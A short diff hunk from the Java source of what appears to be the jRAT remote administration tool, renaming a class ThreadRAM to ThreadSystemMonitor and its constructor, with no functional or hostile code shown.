@@ -5,11 +5,11 @@ import pro.jrat.packets.outgoing.Packet33RAM;
 import pro.jrat.ui.frames.FrameControlPanel;
 import pro.jrat.ui.panels.PanelControlSystemMonitor;
 
-public class ThreadRAM extends Thread {
+public class ThreadSystemMonitor extends Thread {
 
 	public Slave slave;
 
-	public ThreadRAM(Slave slave) {
+	public ThreadSystemMonitor(Slave slave) {
 		this.slave = slave;
 	}
 
